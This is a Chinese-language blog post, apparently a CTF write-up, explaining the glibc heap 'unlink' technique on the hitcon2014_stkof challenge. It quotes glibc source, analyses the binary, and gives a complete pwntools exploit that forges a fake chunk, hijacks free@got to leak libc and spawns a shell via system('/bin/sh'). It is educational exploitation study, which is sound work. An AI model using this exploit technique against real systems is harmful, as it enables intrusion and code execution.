@@ -1,0 +1,751 @@
+<!DOCTYPE html>
+<html lang="zh-CN" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="keywords" content="" />
+  <meta name="author" content="Closure" />
+  <meta name="description" content="" />
+  
+  
+  <title>
+    
+      Unlink 
+      
+      
+      |
+    
+     Closure
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/favicon.png">
+    <link rel="icon" href="/images/favicon.png">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/avatar.png" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">Closure</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">主页</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">归档</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          <a href="/friends/">Friends</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">关于我</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">Unlink</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+          2022-03-01 13:35:06
+        </span>
+        
+              <span class="post-tags">
+                <i class="iconfont icon-tags mr-10" title="标签"></i>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/pwn-%E5%A0%86/" title="pwn_堆">
+                    #pwn_堆
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <h1 id="Unlink："><a href="#Unlink：" class="headerlink" title="Unlink："></a>Unlink：</h1><p>先简要说明一下我认为unlink的使用：伪造一个fake_free_chunk,与存放堆块指针的数组组成双链表，在unlink触发后，数组内的堆块指针将会改成数组的地址，如此，我们就可以控制数组内的堆块指针使其指向我们想要指向的区域&#x3D;&#x3D;》所以利用unlink的必要条件是可以获得堆块数组的地址(仅个人理解)</p>
+<h2 id="unlink介绍："><a href="#unlink介绍：" class="headerlink" title="unlink介绍："></a>unlink介绍：</h2><h4 id="unlink源码："><a href="#unlink源码：" class="headerlink" title="unlink源码："></a>unlink源码：</h4><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">unlink</span><span class="token expression"><span class="token punctuation">(</span>AV<span class="token punctuation">,</span> P<span class="token punctuation">,</span> BK<span class="token punctuation">,</span> FD<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                                            </span></span>
+    FD <span class="token operator">=</span> P<span class="token operator">-></span>fd<span class="token punctuation">;</span>								      
+    BK <span class="token operator">=</span> P<span class="token operator">-></span>bk<span class="token punctuation">;</span>								      
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__builtin_expect</span> <span class="token punctuation">(</span>FD<span class="token operator">-></span>bk <span class="token operator">!=</span> P <span class="token operator">||</span> BK<span class="token operator">-></span>fd <span class="token operator">!=</span> P<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>		      
+      <span class="token function">malloc_printerr</span> <span class="token punctuation">(</span>check_action<span class="token punctuation">,</span> <span class="token string">"corrupted double-linked list"</span><span class="token punctuation">,</span> P<span class="token punctuation">,</span> AV<span class="token punctuation">)</span><span class="token punctuation">;</span>  
+    <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>								      
+        FD<span class="token operator">-></span>bk <span class="token operator">=</span> BK<span class="token punctuation">;</span>							      
+        BK<span class="token operator">-></span>fd <span class="token operator">=</span> FD<span class="token punctuation">;</span>							      
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_smallbin_range</span> <span class="token punctuation">(</span>P<span class="token operator">-></span>size<span class="token punctuation">)</span>				      
+            <span class="token operator">&amp;&amp;</span> <span class="token function">__builtin_expect</span> <span class="token punctuation">(</span>P<span class="token operator">-></span>fd_nextsize <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>		      
+	    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__builtin_expect</span> <span class="token punctuation">(</span>P<span class="token operator">-></span>fd_nextsize<span class="token operator">-></span>bk_nextsize <span class="token operator">!=</span> P<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>	      
+		<span class="token operator">||</span> <span class="token function">__builtin_expect</span> <span class="token punctuation">(</span>P<span class="token operator">-></span>bk_nextsize<span class="token operator">-></span>fd_nextsize <span class="token operator">!=</span> P<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    
+	      <span class="token function">malloc_printerr</span> <span class="token punctuation">(</span>check_action<span class="token punctuation">,</span>				      
+			       <span class="token string">"corrupted double-linked list (not small)"</span><span class="token punctuation">,</span>    
+			       P<span class="token punctuation">,</span> AV<span class="token punctuation">)</span><span class="token punctuation">;</span>					      
+            <span class="token keyword">if</span> <span class="token punctuation">(</span>FD<span class="token operator">-></span>fd_nextsize <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>				      
+                <span class="token keyword">if</span> <span class="token punctuation">(</span>P<span class="token operator">-></span>fd_nextsize <span class="token operator">==</span> P<span class="token punctuation">)</span>				      
+                  FD<span class="token operator">-></span>fd_nextsize <span class="token operator">=</span> FD<span class="token operator">-></span>bk_nextsize <span class="token operator">=</span> FD<span class="token punctuation">;</span>		      
+                <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>							      
+                    FD<span class="token operator">-></span>fd_nextsize <span class="token operator">=</span> P<span class="token operator">-></span>fd_nextsize<span class="token punctuation">;</span>			      
+                    FD<span class="token operator">-></span>bk_nextsize <span class="token operator">=</span> P<span class="token operator">-></span>bk_nextsize<span class="token punctuation">;</span>			      
+                    P<span class="token operator">-></span>fd_nextsize<span class="token operator">-></span>bk_nextsize <span class="token operator">=</span> FD<span class="token punctuation">;</span>			      
+                    P<span class="token operator">-></span>bk_nextsize<span class="token operator">-></span>fd_nextsize <span class="token operator">=</span> FD<span class="token punctuation">;</span>			      
+                  <span class="token punctuation">&#125;</span>							      
+              <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>							      
+                P<span class="token operator">-></span>fd_nextsize<span class="token operator">-></span>bk_nextsize <span class="token operator">=</span> P<span class="token operator">-></span>bk_nextsize<span class="token punctuation">;</span>		      
+                P<span class="token operator">-></span>bk_nextsize<span class="token operator">-></span>fd_nextsize <span class="token operator">=</span> P<span class="token operator">-></span>fd_nextsize<span class="token punctuation">;</span>		      
+              <span class="token punctuation">&#125;</span>								      
+          <span class="token punctuation">&#125;</span>								      
+      <span class="token punctuation">&#125;</span>									      
+<span class="token punctuation">&#125;</span></code></pre>
+
+
+
+<h4 id="unlink使用与free："><a href="#unlink使用与free：" class="headerlink" title="unlink使用与free："></a>unlink使用与free：</h4><p>在执行free()函数时执行了_int_free()函数，在_int_free()函数中调用了unlink宏&#x3D;&#x3D;》</p>
+<pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">unlink</span><span class="token expression"><span class="token punctuation">(</span>AV<span class="token punctuation">,</span> P<span class="token punctuation">,</span> BK<span class="token punctuation">,</span> FD<span class="token punctuation">)</span></span></span>
+<span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">_int_free</span> <span class="token punctuation">(</span>mstate av<span class="token punctuation">,</span> mchunkptr p<span class="token punctuation">,</span> <span class="token keyword">int</span> have_lock<span class="token punctuation">)</span>
+<span class="token function">free</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+	<span class="token function">_int_free</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+		<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span></code></pre>
+
+
+
+<p>free对chunk的状态检查：</p>
+<p>1、检查与被释放chunk相邻高地址的chunk的prev_size的值是否等于被释放的chunk的size大小(忽略P标志位)</p>
+<p>2、检查与被释放chunk相邻高地址的chunk的size的P标志位是否为0&#x3D;&#x3D;》代表它前一个chunk是否为空闲状态</p>
+<p>3、检查前后被释放的chunk的fd和bk</p>
+<h3 id="例题：hitcon2014-stkof"><a href="#例题：hitcon2014-stkof" class="headerlink" title="例题：hitcon2014_stkof:"></a>例题：hitcon2014_stkof:</h3><h5 id="检查保护："><a href="#检查保护：" class="headerlink" title="检查保护："></a>检查保护：</h5><p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220308145512590.png"></p>
+<p>开启了canary和NX</p>
+<h5 id="静态分析："><a href="#静态分析：" class="headerlink" title="静态分析："></a>静态分析：</h5><h6 id="主函数："><a href="#主函数：" class="headerlink" title="主函数："></a>主函数：</h6><p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220308171047429.png"></p>
+<h6 id="1、创建："><a href="#1、创建：" class="headerlink" title="1、创建："></a>1、创建：</h6><p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220308151734731.png"></p>
+<p>在主界面输入1回车即可进入指针创建堆块的功能&#x3D;&#x3D;》输入堆块大小&#x3D;&#x3D;》程序输出堆块index，输出ok</p>
+<h6 id="2、修改："><a href="#2、修改：" class="headerlink" title="2、修改："></a>2、修改：</h6><p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220308170108154.png"></p>
+<p>在主界面输入2回车即可进入修改堆块的功能&#x3D;&#x3D;》输入index&#x3D;&#x3D;》输入size&#x3D;&#x3D;》输入content</p>
+<p>fread函数解析：</p>
+<p>函数原型&#x3D;&#x3D;》</p>
+<pre class="language-c" data-language="c"><code class="language-c"><span class="token class-name">size_t</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>ptr<span class="token punctuation">,</span> <span class="token class-name">size_t</span> size<span class="token punctuation">,</span> <span class="token class-name">size_t</span> nmemb<span class="token punctuation">,</span> FILE <span class="token operator">*</span>stream<span class="token punctuation">)</span></code></pre>
+
+<p>参数解析&#x3D;&#x3D;》</p>
+<p>ptr：指向带有最小尺寸size*nmemb字节的内存块的指针</p>
+<p>size：要读取的每个元素的大小，以字节为单位</p>
+<p>nmemb：元素的个数，每个元素的大小为size字节</p>
+<p>stream：指向FILE对象的指针，该FILE对象指针指定了一个输入流</p>
+<p>返回值&#x3D;&#x3D;》</p>
+<p>成功读取的元素总数会以size_t对象返回，size_t对象是一个整数数据类型</p>
+<h6 id="3、删除："><a href="#3、删除：" class="headerlink" title="3、删除："></a>3、删除：</h6><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220308170655089.png" style="zoom:67%;" />
+
+<p>在主界面输入3回车即可进入释放对快的功能&#x3D;&#x3D;》输入index即可</p>
+<h6 id="4、打印-无用-："><a href="#4、打印-无用-：" class="headerlink" title="4、打印(无用)："></a>4、打印(无用)：</h6><p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220308170836857.png"></p>
+<p>在主界面输入4回车即可进入打印界面&#x3D;&#x3D;》输出一条字符串，没有明显帮助</p>
+<h5 id="动态分析："><a href="#动态分析：" class="headerlink" title="动态分析："></a>动态分析：</h5><p>首先创建几个堆块查看内存情况&#x3D;&#x3D;》</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220308190226544.png"></p>
+<p>红色区域为我们创建的堆块，而第一和第三个堆块则是程序在执行输入输出操作时申请的缓冲区&#x3D;&#x3D;》初次使用fget()函数和printf()函数的时候</p>
+<p>&#x3D;&#x3D;》chunk1在两个io_chunk之间&#x3D;&#x3D;》很难对chunk1进行漏洞利用&#x3D;&#x3D;》由chunk2溢出至chunk3</p>
+<p>查看溢出后果：</p>
+<p>未执行修改&#x3D;&#x3D;》</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220308191049938.png"></p>
+<p>执行修改&#x3D;&#x3D;》</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220308191245154.png"></p>
+<p>&#x3D;&#x3D;》可以进行任意长度的溢出</p>
+<h5 id="思路总结："><a href="#思路总结：" class="headerlink" title="思路总结："></a>思路总结：</h5><p>1、chunk1无法利用</p>
+<p>2、修改堆块内容可以进行任意长度的溢出</p>
+<p>3、没有打印功能</p>
+<p>&#x3D;&#x3D;》</p>
+<p>触发unlink需要的条件&#x3D;&#x3D;》空闲块&#x3D;&#x3D;》伪造空闲快&#x3D;&#x3D;》</p>
+<p>在chunk2的data区域伪造fake_free_chunk&#x3D;&#x3D;》</p>
+<p>通过溢出修改chunk3的prev_size和size的P标志位，让chunk3在释放的时候可以前向合并&#x3D;&#x3D;》触发unlink</p>
+<p>构造fake_free_chunk&#x3D;&#x3D;》</p>
+<pre class="language-none"><code class="language-none">prev_size+size+fd+bk+next_prev+next_size&#x3D;&#x3D;》0x30</code></pre>
+
+<p>prev_size:只想通过释放chunk3的时候前向合并fake_chunk&#x3D;&#x3D;》纸0</p>
+<p>size:0x20</p>
+<p>next_prev:为了绕过检查，证明fake_chunk为空闲状态&#x3D;&#x3D;》next_prev&#x3D;&#x3D;size&#x3D;&#x3D;0x20</p>
+<p>next_size:不进行检查，字符串占位</p>
+<pre class="language-python" data-language="python"><code class="language-python">fake_free_chunk<span class="token operator">=</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>fd_bk<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">8</span></code></pre>
+
+<p>但是我在后文中并没有去伪造next_prev就成功打通了，后续有机会看看源码</p>
+<p>chunk3要求&#x3D;&#x3D;》</p>
+<p>伪造free_chunk还需要修改下一个chunk也就是chunk3的prev_size大小&#x3D;&#x3D;》0x30</p>
+<p>还需要将chunk3的P标志位改为0</p>
+<p>chunk大小还必须超过fastbin的最大值&#x3D;&#x3D;》unsorted bin&#x3D;&#x3D;》至少是0x90</p>
+<p>&#x3D;&#x3D;》</p>
+<pre class="language-python" data-language="python"><code class="language-python">payload<span class="token operator">=</span>fake_free_chunk<span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">)</span></code></pre>
+
+
+
+<h4 id="Unlink重点："><a href="#Unlink重点：" class="headerlink" title="Unlink重点："></a>Unlink重点：</h4><p>此时fake_free_chunk已经伪造好了，并且与0x602140和0x602138组成了双链表</p>
+<p>将0x602140看成一个堆块：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220309162407424.png"></p>
+<p>将0x602138看成一个堆块：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220309162419664.png"></p>
+<p>未unlink状态：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220309160647883.png"></p>
+<p>此时只要将fake_free_chunk从双链表中摘除，也就是chunk3与fake_free_chunk合并即可摘除fake_free_chunk触发unlink</p>
+<p>unlink状态：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220309161528748.png"></p>
+<p>此时0x602140堆块的fd将变成0x602138</p>
+<p>0x602138堆块的bk将变成0x602140&#x3D;&#x3D;》</p>
+<h6 id="注意点："><a href="#注意点：" class="headerlink" title="注意点："></a><strong>注意点：</strong></h6><p>两个堆块修改的区域都是chunk2的指针&#x3D;&#x3D;》</p>
+<p>由于首先执行chunk2变成0x602140&#x3D;&#x3D;》后执行的chunk2变成0x602138</p>
+<p>&#x3D;&#x3D;》<strong>最终形态是chunk2指针变成0x602138</strong>&#x3D;&#x3D;》<strong>控制堆块指针数组</strong></p>
+<p>&#x3D;&#x3D;》unlink过程已结束&#x3D;&#x3D;》</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220309162701413.png"></p>
+<p>chunk1指针不变，chiunk2指向堆块指针数组，chunk3被释放，指针清零，chunk4指针不变</p>
+<p>控制了堆块指针数组就可以对其进行edit修改堆块指针指向的区域&#x3D;&#x3D;》</p>
+<p>获得shell条件&#x3D;&#x3D;》</p>
+<p>1、system()&#x3D;&#x3D;》泄露地址获取libc&#x3D;&#x3D;》考虑将free@got修改成puts@plt，将一个堆块的指针修改为puts@got&#x3D;&#x3D;》在进行free这个堆块时就可以调用puts@plt将puts_addr打印出来&#x3D;&#x3D;》接收地址，计算system()函数地址&#x3D;&#x3D;》再次修改free@got成system()</p>
+<pre class="language-python" data-language="python"><code class="language-python">payload<span class="token operator">=</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'free'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+edit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>
+payload<span class="token operator">=</span>p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>
+dele<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
+puts_addr <span class="token operator">=</span>u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+libcbase<span class="token operator">=</span>puts_addr<span class="token operator">-</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
+sys_addr<span class="token operator">=</span>libcbase<span class="token operator">+</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
+payload<span class="token operator">=</span>p64<span class="token punctuation">(</span>sys_addr<span class="token punctuation">)</span>
+edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span></code></pre>
+
+<p>2、&#x2F;bin&#x2F;sh&#x3D;&#x3D;》将一个堆块的指针修改为’&#x2F;bin&#x2F;sh’&#x3D;&#x3D;》释放时free函数就会以’&#x2F;bin&#x2F;sh’作为参数</p>
+<h5 id="exp："><a href="#exp：" class="headerlink" title="exp："></a>exp：</h5><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#coding=UTF-8</span>
+<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+<span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span>
+<span class="token comment">#context.log_level = 'debug'</span>
+
+<span class="token comment">#io=remote('node4.buuoj.cn',27050)</span>
+io<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">'./stkof'</span> <span class="token punctuation">)</span>
+elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'./stkof'</span><span class="token punctuation">)</span>
+<span class="token comment">#libc=ELF('/home/giantbranch/glibc-all-in-one-master/libs/2.23-0ubuntu3_amd64/libc-2.23.so' )</span>
+libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">"/lib/x86_64-linux-gnu/libc.so.6"</span><span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">:</span>
+	io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>
+	io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
+	io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'OK\n'</span><span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>
+	io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>
+	io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
+	io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+	io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>content<span class="token punctuation">)</span>
+	io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'OK\n'</span><span class="token punctuation">)</span>	
+
+<span class="token keyword">def</span> <span class="token function">dele</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
+	io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span>
+	io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+add<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span>
+add<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span>
+add<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span>
+add<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span>
+
+fd<span class="token operator">=</span><span class="token number">0x602138</span>
+bk<span class="token operator">=</span><span class="token number">0x602140</span>
+
+payload<span class="token operator">=</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>bk<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">)</span>
+
+edit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>
+
+dele<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>
+
+<span class="token comment">#gdb.attach(io)</span>
+
+payload<span class="token operator">=</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'free'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+
+edit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>
+<span class="token comment">#gdb.attach(io)</span>
+payload<span class="token operator">=</span>p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+
+edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>
+
+dele<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
+
+<span class="token comment">#puts_addr=u64(io.recvuntil('\nOK\n', drop=True).ljust(8,'\x00'))</span>
+puts_addr <span class="token operator">=</span>u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+libcbase<span class="token operator">=</span>puts_addr<span class="token operator">-</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
+sys_addr<span class="token operator">=</span>libcbase<span class="token operator">+</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
+<span class="token comment">#binsh=libcbase+next(libc.search('/bin/sh'))</span>
+
+payload<span class="token operator">=</span>p64<span class="token punctuation">(</span>sys_addr<span class="token punctuation">)</span>
+edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>
+
+edit<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span>
+dele<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>
+
+io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
+
+
+
+<h5 id="exp执行效果："><a href="#exp执行效果：" class="headerlink" title="exp执行效果："></a>exp执行效果：</h5><h6 id="远程："><a href="#远程：" class="headerlink" title="远程："></a>远程：</h6><p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220309154059833.png"></p>
+<h6 id="本地："><a href="#本地：" class="headerlink" title="本地："></a>本地：</h6><p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220309154304628.png"></p>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+              2022-03-01 13:35:06
+            </span>
+            
+                  <span class="post-tags">
+                    <i class="iconfont icon-tags mr-10" title="标签"></i>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/pwn-%E5%A0%86/" title="pwn_堆">
+                        #pwn_堆
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+              <a href="/2022/03/03/Extend-and-Overlapping/" target="_self">
+                <span>下一页</span>
